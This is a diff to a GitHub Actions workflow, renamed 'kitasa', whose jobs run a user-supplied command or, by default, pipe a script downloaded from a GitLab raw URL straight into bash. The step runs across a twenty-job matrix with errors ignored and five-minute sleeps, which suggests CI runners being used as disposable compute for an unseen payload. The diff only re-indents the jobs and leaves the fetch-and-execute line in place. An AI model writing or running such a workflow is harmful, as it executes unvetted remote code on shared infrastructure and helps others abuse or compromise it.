@@ -1,4 +1,4 @@
-name: iokoi
+name: kitasa
 
 on:
   workflow_dispatch:
@@ -27,16 +27,16 @@ jobs:
     needs: [hert]
     runs-on: ubuntu-latest
     strategy:
-    fail-fast: false
-    matrix:
-      build: [C.1, D.1]
-      flag: [A, B, C, D, E, F, G, H, I, J]
-  steps:
-    - name: Jalankan perintah
-      continue-on-error: true
-      run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}
-    - name: okes
-      run: sleep 300   # 300 detik = 5 menit
+      fail-fast: false        
+      matrix:
+        build: [C.1, D.1]
+        flag: [A, B, C, D, E, F, G, H, I, J]
+    steps:                   
+      - name: Jalankan perintah
+        continue-on-error: true
+        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}
+      - name: okes
+        run: sleep 300        # 5 menit
 
   dert:
     needs: [hert]
@@ -49,4 +49,4 @@ jobs:
     steps:
       - name: dertjob
         continue-on-error: true
-        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}     
+        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}
